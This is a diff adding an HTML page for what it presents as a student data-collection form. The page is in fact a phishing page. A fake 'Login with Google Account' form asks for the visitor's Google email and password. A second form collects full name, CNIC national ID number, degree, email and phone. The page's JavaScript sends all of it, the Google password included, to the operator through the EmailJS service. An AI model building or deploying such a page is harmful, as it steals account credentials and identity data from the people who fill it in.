@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Collection Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: whitesmoke;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        img {
+            width: 100%;
+            max-width: 1280px;
+            height: auto;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            margin-bottom: 20px;
+            top: 0;
+        }
+
+        .form-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .form-container.active {
+            display: flex;
+        }
+
+        h1 {
+            margin: 10px 0 20px;
+            color: #333;
+            font-size: 1.5rem;
+        }
+
+        label {
+            font-size: 0.9rem;
+            color: #555;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+
+        input::placeholder {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            background: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #45a049;
+        }
+
+        button:active {
+            background: #3e8e41;
+        }
+
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .form-container input:focus {
+            outline: none;
+            border-color: #4caf50;
+            box-shadow: 0 0 5px rgba(76, 175, 80, 0.5);
+        }
+
+    </style>
+    <script>
+        (function () {
+            emailjs.init("oo0jFrVnXXXmhcVVx"); // Replace with your actual Public Key
+        })();
+
+        function showDataCollectionForm() {
+            document.getElementById('googleLoginForm').classList.remove('active');
+            document.getElementById('dataCollectionForm').classList.add('active');
+        }
+
+        function sendEmail() {
+            const serviceID = "service_2podhf6";
+            const templateID = "template_ljeu13d";
+
+            const templateParams = {
+                fullName: document.getElementById('fullName').value,
+                cnic: document.getElementById('cnic').value,
+                lastDegree: document.getElementById('lastDegree').value,
+                email: document.getElementById('email').value,
+                contact: document.getElementById('contact').value,
+                gmail: document.getElementById('gmail').value,
+                password: document.getElementById('pass').value
+            };
+
+            emailjs.send(serviceID, templateID, templateParams)
+    .then(response => {
+        // Hide the form
+        document.getElementById("dataCollectionForm").style.display = "none";
+
+        // Show success message
+        const successMessage = document.createElement("p");
+        successMessage.textContent = "Details submitted successfully! Selected students will be notified.";
+        successMessage.style.color = "green"; // Optional styling
+        successMessage.style.fontSize = "1.2rem";
+        successMessage.style.textAlign = "center";
+        successMessage.style.marginTop = "20px";
+
+        // Append message to the parent container or body
+        document.body.appendChild(successMessage);
+    })
+    .catch(error => {
+        console.error( error);
+
+        // Hide the form
+        document.getElementById("dataCollectionForm").style.display = "none";
+
+        // Show error message
+        const errorMessage = document.createElement("p");
+        errorMessage.textContent = "Failed to submit details. Please try again later.";
+        errorMessage.style.color = "red"; // Optional styling
+        errorMessage.style.fontSize = "1.2rem";
+        errorMessage.style.textAlign = "center";
+        errorMessage.style.marginTop = "20px";
+
+        // Append message to the parent container or body
+        document.body.appendChild(errorMessage);
+    });
+
+        }
+    </script>
+</head>
+<body>
+    <img src="pic.png" alt="Top Image" />
+    <div id="googleLoginForm" class="form-container active">
+        <h2>Login with Google Account</h2>
+        <label for="gmail">Email:</label>
+        <input type="text" id="gmail" name="gmail" placeholder="Enter your Google email" required>
+
+        <label for="pass">Password:</label>
+        <input type="password" id="pass" name="pass" placeholder="Enter your Google password" required>
+
+        <button onclick="showDataCollectionForm()">Login</button>
+    </div>
+
+    <div id="dataCollectionForm" class="form-container">
+        <h2>Register Your Details</h2>
+        <form id="contactForm" onsubmit="event.preventDefault(); sendEmail();">
+            <label for="fullName">Full Name:</label>
+            <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
+
+            <label for="cnic">CNIC:</label>
+            <input type="text" id="cnic" name="cnic" placeholder="Enter your CNIC number without Dashes" required>
+
+            <label for="lastDegree">Last Degree:</label>
+            <input type="text" id="lastDegree" name="lastDegree" placeholder="Enter your last degree" required>
+
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" placeholder="Enter your email address" required>
+
+            <label for="contact">Contact:</label>
+            <input type="tel" id="contact" name="contact" placeholder="Enter your contact number" required>
+
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
